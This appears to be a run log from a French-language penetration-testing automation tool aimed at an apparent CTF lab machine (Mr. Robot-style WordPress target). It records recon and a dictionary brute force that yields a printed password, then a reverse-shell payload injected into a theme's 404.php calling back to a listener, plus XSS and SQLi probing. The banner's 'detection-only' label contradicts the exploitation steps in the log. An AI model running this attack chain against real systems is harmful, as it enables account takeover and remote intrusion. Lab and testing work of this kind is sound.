@@ -1,0 +1,132 @@
+$ python3 /pentool/pentool-v0.065.py 10.48.187.129 --ui cli --authorized --workspace /runs --run-id 0165c3cfe4 --pn --staged --scan-mode pentest --preset pro-fast --searchsploit --nuclei --enum4linux --ffuf --no-nikto --web-early --no-web-early --web-crawl --sqlmap --xss --max-web-urls 2 --max-gobuster 1 --gobuster-threads 15 --lhost 192.168.137.185 --lport 4445 --archive-crack --wp-brute --wp-aggressive --wp-exploit
+# started: 2026-06-15 12:43:27
+
+
+ ██████╗ ███████╗███╗   ██╗████████╗ ██████╗  ██████╗ ██╗
+ ██╔══██╗██╔════╝████╗  ██║╚══██╔══╝██╔═══██╗██╔═══██╗██║
+ ██████╔╝█████╗  ██╔██╗ ██║   ██║   ██║   ██║██║   ██║██║
+ ██╔═══╝ ██╔══╝  ██║╚██╗██║   ██║   ██║   ██║██║   ██║██║
+ ██║     ███████╗██║ ╚████║   ██║   ╚██████╔╝╚██████╔╝███████╗
+ ╚═╝     ╚══════╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
+
+pentool v0.66 — Recon/Enum automation (detection-only)
+
+Outils présents: nmap, whatweb, nikto, gobuster, ffuf, searchsploit, nuclei, enum4linux-ng
+  Wordlist: common.txt (37 Ko)
+Wordlist custom : /usr/share/seclists/Discovery/Web-Content/common.txt (37 Ko)
+LHOST `192.168.137.185` vérifié et sauvegardé.
+Target: 10.48.187.129
+Run dir: /runs/10.48.187.129/0165c3cfe4
+Preset: pro-fast | Staged Nmap: True | scan-mode: pentest
+Étape 1/4 — Nmap ports discovery (pentest, staged)
+OK  [nmap ports] (2.1s) -> /runs/10.48.187.129/0165c3cfe4/logs/nmap_ports_cmd.txt
+Ports ouverts détectés: 22,80,443
+Étape 2/4 — Nmap enum ciblée (ports ouverts)
+OK  [nmap enum] (8.5s) -> /runs/10.48.187.129/0165c3cfe4/logs/nmap_enum_cmd.txt
+Nmap enum sans résultat (ports filtrés/ralentis) — fallback sur ports discovery
+22/tcp ssh   
+80/tcp http   
+443/tcp https   
+Étape 3b/4 — Searchsploit (références Exploit-DB via --nmap)
+OK  [searchsploit] (0.0s) -> /runs/10.48.187.129/0165c3cfe4/logs/searchsploit_cmd.txt
+enum4linux-ng: aucun service SMB détecté -> SKIP
+URLs détectées: http://10.48.187.129, https://10.48.187.129
+Étape 4/4 — Enum web automatique (parallèle)
+nikto désactivé (--no-nikto)
+ffuf activé (remplace gobuster)
+OK  [whatweb http://10.48.187.129] (17.3s) -> /runs/10.48.187.129/0165c3cfe4/logs/whatweb_http___10.48.187.129.txt
+OK  [whatweb https://10.48.187.129] (17.4s) -> /runs/10.48.187.129/0165c3cfe4/logs/whatweb_https___10.48.187.129.txt
+OK  [ffuf https://10.48.187.129] (161.8s) -> /runs/10.48.187.129/0165c3cfe4/logs/ffuf_https___10.48.187.129.txt
+OK  [ffuf http://10.48.187.129] (162.4s) -> /runs/10.48.187.129/0165c3cfe4/logs/ffuf_http___10.48.187.129.txt
+[ffuf followup] Exploration de 70 résultat(s) ffuf
+[+] [ffuf followup] Téléchargement: http://10.48.187.129/admin/ → admin
+[+] [ffuf followup] Téléchargement: http://10.48.187.129/wp-admin/ → wp-admin
+[+] [ffuf followup] Téléchargement: http://10.48.187.129/robots.txt → robots.txt
+[+] [ffuf followup] Téléchargement: http://10.48.187.129/sitemap.xml → sitemap.xml
+[+] [ffuf followup] Téléchargement: http://10.48.187.129/wp-config → wp-config
+[ffuf followup] 5 finding(s) — voir /runs/10.48.187.129/0165c3cfe4/logs/ffuf_followup.txt
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/0/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/Image/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/admin/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/feed/atom/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/wp-admin/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/favicon.ico
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/feed/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/image/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/index.html
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/intro
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/license
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/wp-login.php
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/readme
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/feed/rdf/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/robots
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/robots.txt
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/sitemap
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/sitemap.xml
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/wp-content/
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/wp-config
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/wp-cron
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/wp-links-opml
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/wp-load
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/wp-login
+[ffuf followup] Nouvelle URL ajoutée au pipeline: http://10.48.187.129/wp-login.php?action=register
+[robots] Analyse robots.txt + sitemap.xml
+[+] [robots] http://10.48.187.129/robots.txt (41 octets)
+  → [robots] Entrée non-standard: http://10.48.187.129/fsocity.dic
+[+] [robots] Fichier téléchargé: http://10.48.187.129/fsocity.dic → fsocity.dic (7245381 octets)
+  → [robots] Entrée non-standard: http://10.48.187.129/key-1-of-3.txt
+[+] [robots] Fichier téléchargé: http://10.48.187.129/key-1-of-3.txt → key-1-of-3.txt (33 octets)
+[+] [robots] http://10.48.187.129/admin/robots.txt (43 octets)
+[+] [robots] http://10.48.187.129/wp-links-opml/sitemap.xml (227 octets)
+[+] [robots] http://10.48.187.129/wp-links-opml/sitemap_index.xml (227 octets)
+[+] [robots] http://10.48.187.129/wp-login/sitemap.xml (2671 octets)
+[+] [robots] http://10.48.187.129/wp-login/sitemap_index.xml (2671 octets)
+[robots] 2 chemin(s) extrait(s) → ajoutés au pipeline
+[JS scraper] Analyse des fichiers JavaScript
+[+] [JS scraper] Password trouvé: password: ",delay:500},{clear:!0,type:"
+[+] [JS scraper] Password trouvé: password: ",delay:500},{clear:!0,type:"
+[JS scraper] 11 fichier(s) JS analysé(s)
+[.git] Vérification exposition dépôt Git
+[.git] Aucun dépôt exposé trouvé
+[WPRecon] WordPress détecté → http://10.48.187.129
+[WPRecon] Lancement wpscan (mode: aggressive)...
+[WPRecon] wpscan timeout (4 min)
+[WPRecon] Version WP: 4.3.1
+[WPRecon] Test XML-RPC → http://10.48.187.129/xmlrpc.php
+[WPRecon] XML-RPC ACTIVÉ — endpoint accessible
+[WPRecon] Recherche exploits via searchsploit...
+[WPRecon] Terminé — XML-RPC activé, WP 4.3.1
+[WebUI] En attente de confirmation : Brute Force WordPress — attaque par dictionnaire
+[WebUI] Confirmation reçue : Brute Force WordPress — attaque par dictionnaire
+[WPScan] WordPress brute force → http://10.48.187.129
+[WPScan] Wordlist: /runs/10.48.187.129/0165c3cfe4/logs/robots_downloads/fsocity.dic (7075 Ko)
+[WPScan] Wordlist volumineux → déduplication...
+[WPScan] Dédup: 11451 mots uniques → dedup_fsocity.dic
+[WPScan] Phase 1 — Enumération des utilisateurs via wpscan...
+[WPScan] Aucun user trouvé via --enumerate u — tentative avec wordlist comme usernames...
+[WPScan] Enum fallback: 11451 mots → wp-login.php (arrêt au 1er username valide)
+[+] [WPScan] Username valide: Elliot
+[WPScan] Phase 2 — Brute force passwords (['Elliot'])...
+[+] [WPScan] CREDENTIAL TROUVÉ: Elliot:ER28-0652
+[WebUI] En attente de confirmation : WordPress — Theme File Injection (Reverse Shell)
+[WebUI] Confirmation reçue : WordPress — Theme File Injection (Reverse Shell)
+[WP Exploit] Login → http://10.48.187.129/wp-login.php (Elliot)
+[WP Exploit] Authentifié sur wp-admin ✓
+[WP Exploit] Thème actif détecté: twentyfifteen
+[WP Exploit] 404.php récupéré (809 bytes)
+[WP Exploit] Réponse ambiguë (HTTP 200) — tentative de déclenchement quand même
+[WP Exploit] PAYLOAD INJECTE dans twentyfifteen/404.php
+[WP Exploit] LHOST dans le payload : 192.168.137.185:4445
+[WP Exploit] Listener 0.0.0.0:4445 — attente 90s (meme que FTP)...
+[WP Exploit] Declencheur HTTP -> http://10.48.187.129/?p=88888404notfound
+[WP Exploit] Declencheur HTTP -> http://10.48.187.129/wp-content/themes/twentyfifteen/404.php
+[WP Exploit] Timeout 90s — aucune connexion recue sur 192.168.137.185:4445
+Web crawl — exploration de 18 pages cibles (max 20)
+[+] Web crawl : 2 formulaire(s), 1 param(s), 3 endpoint(s) (20 pages visitées)
+XSS scan — test des formulaires et paramètres URL
+[+] XSS trouvée! [Possible XSS (partial reflection)] http://10.48.187.129/wp-login.php?action=register → param: action
+[+] XSS trouvée! [Possible XSS (partial reflection)] http://10.48.187.129/wp-login.php?action=lostpassword → param: action
+[+] XSS trouvée! [Possible XSS (partial reflection)] http://10.48.187.129/wp-login.php → param: log (POST)
+[+] XSS trouvée! [Reflected XSS] http://10.48.187.129/wp-login.php?action=lostpassword → param: user_login (POST)
+SQLmap — test de 4 cible(s) (SQLi automatique)
